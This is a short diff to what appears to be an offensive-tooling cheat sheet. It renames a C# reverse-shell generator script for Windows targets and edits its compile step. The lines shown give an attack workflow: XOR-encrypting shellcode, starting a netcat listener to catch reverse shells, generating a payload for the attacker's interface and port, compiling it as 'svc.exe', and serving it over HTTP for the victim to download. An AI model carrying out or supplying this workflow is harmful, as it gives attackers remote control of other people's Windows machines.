@@ -194,7 +194,7 @@ python3 xor_encrypt_bin.py shellcode.bin --key 0xAB --stdout | xxd | head
 
 ---
 
-## cs_revshell / gen.sh (Windows target)
+## cs_revshell / revgen.sh (Windows target)
 
 **Platform:** Run on Kali · Target: Windows
 
@@ -213,7 +213,7 @@ rlwrap nc -lvnp 5986
 ./cs_revshell/gen.sh eth0 443 /tmp/drop 10 1000
 
 # Compile on Kali → drop exe
-mcs -out:svc.exe shell.cs
+TERM=dumb mcs -out:svc.exe shell.cs
 python3 -m http.server 8080
 ```
 
